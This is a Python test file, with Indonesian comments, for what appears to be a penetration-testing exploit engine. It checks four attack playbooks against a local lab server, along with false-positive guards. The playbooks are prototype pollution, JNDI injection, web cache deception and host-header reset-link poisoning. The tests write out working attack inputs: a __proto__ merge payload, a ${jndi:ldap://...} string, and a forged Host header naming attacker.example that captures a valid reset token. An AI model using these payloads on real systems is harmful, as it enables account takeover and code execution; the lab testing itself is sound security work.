"""Test F26 batch 3 — konsolidasi katalog (docs/CATALOG-CONSOLIDATION.md).

4 playbook tier-1 proof baru dari katalog legacy:
  - proto-pollution (CWE-1321, critical) — unsafe merge __proto__, gadget
    /api/config membocorkan canary SETELAH merge (baseline wajib bersih);
  - jndi-oob (CWE-917, critical) — resolver ${jndi:...}, OOB callback
    host-lock (pola ssrf/xxe);
  - cache-deception (CWE-444, high) — dua-langkah tervalidasi lapangan:
    anonim 401 -> auth 200 privat + cache publik -> anonim 200 dari cache;
  - host-header-poison (CWE-444, critical) — link reset dari header Host
    dengan token VALID (diverifikasi), kontrol endpoint safe.

FP-guard: gadget salah / marker bukan-milik / safe-path ikut terpoison /
URL sudah publik -> L0 "not proven", bukan temuan. NOL jaringan
eksternal — lawan uji lab_target 127.0.0.1.
"""
from __future__ import annotations

import json
import sys
import tempfile
import unittest
import urllib.parse
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT / "tools"))
sys.path.insert(0, str(ROOT / "core"))

import exploit_engine as ee  # noqa: E402
import exploit_playbooks as ep  # noqa: E402
import lab_target  # noqa: E402
from findings import validate_finding  # noqa: E402

NEW_PLAYBOOKS = ["proto-pollution", "jndi-oob", "cache-deception",
                 "host-header-poison"]


def _params() -> dict:
    return {
        "proto-pollution": {},
        "jndi-oob": {"path": "/api/log4j", "marker_host": "127.0.0.1"},
        "cache-deception": {"path_prefix": "/cacheable/",
                            "safe_prefix": "/cache-safe/",
                            "marker": lab_target.CACHE_DECEPTION_MARKER},
        "host-header-poison": {"path": "/api/forgot",
                               "safe_path": "/api/forgot-safe",
                               "check_path": "/api/reset-check",
                               "canary_email": "alice@example.com",
                               "poison_host": "attacker.example"},
    }


def _config(tmp: Path, base_url: str, playbooks: list[str],
            params_override: dict | None = None) -> Path:
    params = _params()
    for k, v in (params_override or {}).items():
        params.setdefault(k, {}).update(v)
    p = tmp / "exploit.json"
    p.write_text(json.dumps({
        "targets": [{"id": "lab", "base_url": base_url,
                     "exploit_allowed": True, "mode": "proof",
                     "credentials": {"username": "alice",
                                     "password": "alicepass"},
                     "params": params}],
        "playbooks": playbooks}), encoding="utf-8")
    return p


def _http(base: str, method: str, path: str, body: bytes | None = None,
          headers: dict | None = None) -> tuple[int, dict, str]:
    import urllib.request
    import urllib.error
    req = urllib.request.Request(base + path, data=body, method=method)
    for k, v in (headers or {}).items():
        req.add_header(k, v)
    try:
        with urllib.request.urlopen(req, timeout=5) as r:
            return r.status, dict(r.headers.items()), r.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, dict(e.headers.items()), e.read().decode()


class LabTestCase(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.server, cls.base_url = lab_target.start_lab()

    @classmethod
    def tearDownClass(cls):
        lab_target.stop_lab(cls.server)


class RegistryTest(unittest.TestCase):
    def test_batch3_registered_and_clean(self):
        for name in NEW_PLAYBOOKS:
            self.assertIn(name, ep.PLAYBOOKS)
            pb = ep.PLAYBOOKS[name]
            self.assertFalse(pb.techniques & ep.NEVER_LIST)
            self.assertEqual(pb.tier, 1, "batch 3 semua tier-1 (proof)")
        self.assertEqual(len(ep.PLAYBOOKS), 38)


class LabEndpointTest(LabTestCase):
    def test_proto_pollution_merge_then_gadget(self):
        st, _, body = _http(self.base_url, "GET", "/api/config")
        self.assertEqual(st, 200)
        self.assertNotIn("polluted", body)
        st, _, _ = _http(self.base_url, "POST", "/api/merge",
                         body=json.dumps({"__proto__": {"polluted": "x1"}})
                         .encode(),
                         headers={"Content-Type": "application/json"})
        self.assertEqual(st, 200)
        st, _, body = _http(self.base_url, "GET", "/api/config")
        self.assertIn("x1", body)
        self.assertIn("polluted", body)

    def test_log4j_without_jndi_is_not_resolved(self):
        st, _, body = _http(self.base_url, "GET",
                            "/api/log4j?msg=plain%20text")
        self.assertEqual(st, 200)
        self.assertIn('"resolved": false', body)
        # jndi menunjuk port mati -> resolved false (tanpa crash)
        st, _, body = _http(self.base_url, "GET", "/api/log4j?msg="
                            + urllib.parse.quote(
                                "${jndi:ldap://127.0.0.1:1/x}", safe=""))
        self.assertIn('"resolved": false', body)

    def test_cache_deception_three_steps(self):
        # step-1: anonim -> 401
        st, _, body = _http(self.base_url, "GET",
                            "/cacheable/canary-a1.css")
        self.assertEqual(st, 401)
        # step-2: auth -> 200 privat + cache publik
        st, hdr, body = _http(self.base_url, "POST", "/login",
                              body=b"username=alice&password=alicepass",
                              headers={"Content-Type":
                                       "application/x-www-form-urlencoded"})
        sid = hdr.get("Set-Cookie", "").split(";")[0]
        self.assertTrue(sid.startswith("sid="))
        st, hdr, body = _http(self.base_url, "GET",
                              "/cacheable/canary-a1.css",
                              headers={"Cookie": sid})
        self.assertEqual(st, 200)
        self.assertIn(lab_target.CACHE_DECEPTION_MARKER, body)
        self.assertIn("public", hdr.get("Cache-Control", ""))
        # step-3: anonim LAGI -> 200 dari cache (esensi deception)
        st, _, body = _http(self.base_url, "GET",
                            "/cacheable/canary-a1.css")
        self.assertEqual(st, 200)
        self.assertIn(lab_target.CACHE_DECEPTION_MARKER, body)
        # kontrol: safe endpoint no-store -> step-3 tetap 401
        st, _, _ = _http(self.base_url, "GET", "/cache-safe/canary-b2.css")
        self.assertEqual(st, 401)
        st, hdr, _ = _http(self.base_url, "GET",
                           "/cache-safe/canary-b2.css",
                           headers={"Cookie": sid})
        self.assertEqual(st, 200)
        self.assertIn("no-store", hdr.get("Cache-Control", ""))
        st, _, _ = _http(self.base_url, "GET", "/cache-safe/canary-b2.css")
        self.assertEqual(st, 401)

    def test_forgot_poisons_link_from_host_header(self):
        st, _, body = _http(self.base_url, "POST", "/api/forgot",
                            body=json.dumps({"email": "alice@example.com"})
                            .encode(),
                            headers={"Content-Type": "application/json",
                                     "Host": "attacker.example"})
        self.assertEqual(st, 200)
        link = json.loads(body)["preview_link"]
        self.assertTrue(link.startswith("http://attacker.example/reset"))
        token = urllib.parse.parse_qs(
            urllib.parse.urlparse(link).query)["token"][0]
        st, _, body = _http(self.base_url, "GET",
                            f"/api/reset-check?token={token}")
        self.assertEqual(st, 200)
        self.assertIn("alice@example.com", body)
        # kontrol: forgot-safe mengabaikan header Host
        st, _, body = _http(self.base_url, "POST", "/api/forgot-safe",
                            body=json.dumps({"email": "alice@example.com"})
                            .encode(),
                            headers={"Content-Type": "application/json",
                                     "Host": "attacker.example"})
        link = json.loads(body)["preview_link"]
        self.assertFalse(link.startswith("http://attacker.example"))
        self.assertTrue(link.startswith(self.base_url))

    def test_forgot_unknown_email_is_generic(self):
        st, _, body = _http(self.base_url, "POST", "/api/forgot",
                            body=json.dumps({"email": "ghost@example.com"})
                            .encode(),
                            headers={"Content-Type": "application/json"})
        self.assertEqual(st, 200)
        self.assertIsNone(json.loads(body)["preview_link"])


class Batch3ProvenE2E(LabTestCase):
    def test_four_playbooks_proven_l3_contract_valid(self):
        with tempfile.TemporaryDirectory() as td:
            tmp = Path(td)
            cfg = _config(tmp, self.base_url, NEW_PLAYBOOKS)
            out = tmp / "findings.json"
            rc = ee.main_with_args(["--config", str(cfg), "--out", str(out)])
            self.assertEqual(rc, 0)
            doc = json.loads(out.read_text(encoding="utf-8"))
            self.assertTrue(all(validate_finding(r) == []
                                for r in doc["findings"]))
            by_pb = {r["playbook"]: r for r in doc["findings"]}
            self.assertEqual(set(by_pb), set(NEW_PLAYBOOKS))
            self.assertEqual(by_pb["proto-pollution"]["verdict"], 3)
            self.assertEqual(by_pb["proto-pollution"]["cwe"], "CWE-1321")
            self.assertEqual(by_pb["proto-pollution"]["severity"], "critical")
            self.assertEqual(by_pb["jndi-oob"]["verdict"], 3)
            self.assertEqual(by_pb["jndi-oob"]["cwe"], "CWE-917")
            self.assertIn("token=", by_pb["jndi-oob"]["callback"])
            self.assertEqual(by_pb["cache-deception"]["verdict"], 3)
            self.assertEqual(by_pb["cache-deception"]["cwe"], "CWE-444")
            self.assertIn(lab_target.CACHE_DECEPTION_MARKER,
                          by_pb["cache-deception"]["response"])
            self.assertEqual(by_pb["host-header-poison"]["verdict"], 3)
            self.assertEqual(by_pb["host-header-poison"]["cwe"], "CWE-444")
            self.assertIn("attacker.example",
                          by_pb["host-header-poison"]["response"])
            self.assertNotIn("alicepass", json.dumps(doc))


class Batch3FpGuard(LabTestCase):
    def _run_one(self, tmp: Path, playbooks: list[str],
                 params_override: dict) -> list[dict]:
        cfg = _config(tmp, self.base_url, playbooks, params_override)
        out = tmp / "f.json"
        rc = ee.main_with_args(["--config", str(cfg), "--out", str(out)])
        self.assertEqual(rc, 0)
        doc = json.loads(out.read_text(encoding="utf-8"))
        self.assertTrue(all(validate_finding(r) == []
                            for r in doc["findings"]))
        return doc["findings"]

    def test_proto_pollution_wrong_gadget_is_not_proven(self):
        with tempfile.TemporaryDirectory() as td:
            tmp = Path(td)
            rows = self._run_one(tmp, ["proto-pollution"],
                                 {"proto-pollution":
                                  {"gadget_path": "/api/products"}})
            self.assertEqual(rows[0]["verdict"], 0)
            self.assertIn("not proven", rows[0]["title"])
            self.assertFalse(rows[0]["reportable"])

    def test_jndi_rejects_foreign_marker_host(self):
        with tempfile.TemporaryDirectory() as td:
            tmp = Path(td)
            rows = self._run_one(tmp, ["jndi-oob"],
                                 {"jndi-oob": {"marker_host": "example.com"}})
            self.assertEqual(rows[0]["verdict"], 0)
            self.assertIn("ditolak", rows[0]["title"])

    def test_cache_deception_on_safe_endpoint_is_not_proven(self):
        with tempfile.TemporaryDirectory() as td:
            tmp = Path(td)
            rows = self._run_one(tmp, ["cache-deception"],
                                 {"cache-deception":
                                  {"path_prefix": "/cache-safe/",
                                   "safe_prefix": "/cache-safe/"}})
            self.assertEqual(rows[0]["verdict"], 0)
            self.assertIn("not proven", rows[0]["title"])

    def test_host_poison_on_safe_endpoint_is_not_proven(self):
        with tempfile.TemporaryDirectory() as td:
            tmp = Path(td)
            rows = self._run_one(tmp, ["host-header-poison"],
                                 {"host-header-poison":
                                  {"path": "/api/forgot-safe"}})
            self.assertEqual(rows[0]["verdict"], 0)
            self.assertIn("not proven", rows[0]["title"])


if __name__ == "__main__":
    unittest.main()
